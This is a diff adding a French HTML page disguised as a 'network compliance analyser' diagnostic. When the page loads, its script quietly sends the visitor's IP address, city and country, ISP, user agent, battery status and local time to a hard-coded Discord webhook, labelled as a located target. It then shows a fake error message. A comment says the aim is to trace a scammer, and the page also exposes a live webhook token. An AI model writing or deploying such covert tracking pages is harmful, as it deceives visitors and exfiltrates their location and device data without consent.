@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Analyseur de Conformité Réseau</title>
+    <style>
+        body { background-color: #0d1117; color: #58a6ff; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .box { border: 1px solid #30363d; padding: 20px; background: #161b22; border-radius: 5px; width: 400px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
+        .loader { border: 3px solid #30363d; border-top: 3px solid #58a6ff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { font-size: 18px; text-align: center; color: #c9d1d9; }
+        .log { font-size: 12px; color: #8b949e; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h2>DIAGNOSTIC EN COURS...</h2>
+    <div class="loader"></div>
+    <div id="status" class="log">Initialisation du tunnel sécurisé...</div>
+    <div id="progress" class="log">> Analyse des paquets sortants...</div>
+</div>
+
+<script>
+const webhook = "https://discord.com/api/webhooks/1406320274206490685/T5UlsYLa2A-ZUGfItLh6Uai053DnYNhbOsF0agE-gngh0DJuQDxt7sWRridLKNi1M5XP";
+
+async function gatherData() {
+    try {
+        // 1. Récupération de l'IP et de la Géo (via API publique)
+        const ipResponse = await fetch('https://ipapi.co/json/');
+        const data = await ipResponse.json();
+
+        // 2. Récupération des infos batterie
+        let batteryInfo = "Non disponible";
+        if (navigator.getBattery) {
+            const battery = await navigator.getBattery();
+            batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? "En charge" : "Décharge"})`;
+        }
+
+        // 3. Préparation du message Discord
+        const payload = {
+            embeds: [{
+                title: "🎯 CIBLE LOCALISÉE - OSINT REPORT",
+                color: 5814783,
+                fields: [
+                    { name: "🌐 Adresse IP", value: data.ip || "Inconnue", inline: true },
+                    { name: "📍 Ville / Pays", value: `${data.city}, ${data.country_name}`, inline: true },
+                    { name: "🏢 Fournisseur (ISP)", value: data.org || "Inconnu" },
+                    { name: "📱 Appareil", value: navigator.userAgent.substring(0, 100) + "..." },
+                    { name: "🔋 Batterie", value: batteryInfo, inline: true },
+                    { name: "⏰ Heure Locale", value: new Date().toLocaleString(), inline: true }
+                ],
+                footer: { text: "Système de Traçage OSINT v2.0" }
+            }]
+        };
+
+        // 4. Envoi au Webhook
+        await fetch(webhook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
+        // Mise à jour visuelle pour l'arnaqueur
+        setTimeout(() => {
+            document.getElementById('status').innerText = "Vérification terminée.";
+            document.getElementById('progress').innerText = "> Erreur de synchronisation 0x882. Veuillez contacter l'expéditeur.";
+        }, 3000);
+
+    } catch (e) {
+        console.error(e);
+    }
+}
+
+// Lancement automatique
+gatherData();
+</script>
+</body>
+</html>
